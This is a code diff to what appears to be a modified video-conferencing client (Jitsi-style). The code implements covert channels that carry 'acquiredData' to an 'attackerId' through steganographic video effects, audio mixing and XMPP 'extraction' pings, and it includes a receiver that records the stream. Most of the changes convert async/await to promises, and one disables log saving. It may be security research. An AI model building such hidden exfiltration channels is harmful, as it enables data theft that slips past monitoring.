@@ -57,24 +57,26 @@ class CovertChannelMethods {
      * Send data using video stream
      * @param {any} data - specified data to be sent
      */
-    static async useVideo(acquiredData, usedMethod) {
+    static useVideo(acquiredData, usedMethod) {
         const localVideo = APP.conference.localVideo;
-        const steganoEffect = await this._createSteganoEffect(localVideo.stream, acquiredData, usedMethod);
 
-        await localVideo.setEffect(steganoEffect);
+        this._createSteganoEffect(localVideo.stream, acquiredData, usedMethod).then(effect => {
+            localVideo.setEffect(effect);
+        });
     }
 
     /**
      * Send data using audio stream
      * @param {any} data - specified data to be sent
      */
-    static async useAudio(data) {
+    static useAudio(data) {
         const desktopAudio = APP.conference._desktopAudioStream;
         const localAudio = APP.conference.localAudio;
-        const mixerEffect = new AudioMixerEffect(desktopAudio);
 
+        new AudioMixerEffect(desktopAudio).then(effect => {
+            localAudio.setEffect(effect);
+        });
 
-        await localAudio.setEffect(mixerEffect);
     }
 
     /**
@@ -103,11 +105,12 @@ class CovertChannelMethods {
      * Send data using audio stream
      * @param {any} data - specified data to be sent
      */
-    static async useXMPP(data) {
+    static useXMPP(data) {
         const user = APP.conference.listMembers()[0].jid;
 
         CovertChannelMethods.extractionPing(user, null, null, 1000, data);
-        APP.conference.saveLogs();
+
+        // APP.conference.saveLogs();
     }
 }
 
@@ -127,12 +130,14 @@ class ExtractionCovertChannelMethods {
     /**
      * Receiving data using video stream
      */
-    static async usedVideo(user) {
+    static usedVideo(user) {
         // define MediaRecorder of received stream
         const mediaRecorder = new MediaRecorder(user._tracks[0].stream);
 
-        mediaRecorder.ondataavailable = async blob => {
-            console.log(await blob.data.arrayBuffer());
+        mediaRecorder.ondataavailable = blob => {
+            blob.data.arrayBuffer().then(data => {
+                console.log('Video:', data);
+            });
         };
         mediaRecorder.start(100);
     }
@@ -140,21 +145,21 @@ class ExtractionCovertChannelMethods {
     /**
      * Receiving data using xmpp ping
      */
-    static async usedXMPP(user) {
+    static usedXMPP(user) {
 
     }
 
     /**
      * Receiving data using audio stream
      */
-    static async usedAudio(user) {}
+    static usedAudio(user) {}
 
     /**
      * TODO: change this
      * not used anymore
      * Receiving data using audio stream
      */
-    static async usedPlain(user) {}
+    static usedPlain(user) {}
 }
 
 
@@ -186,7 +191,7 @@ export class ExtractionHandler {
      * Send data through the specified method.
      * @param {any} data - data to be sent.
      */
-    async sendAll(data, attackerId, dataSize = data.length) {
+    sendAll(data, attackerId, dataSize = data.length) {
         // If the method can loose data through the transition send the final size of sent file.
         if (this.configuration.method !== 'plain') {
             CovertChannelMethods.options[this.configuration.method](dataSize, attackerId);
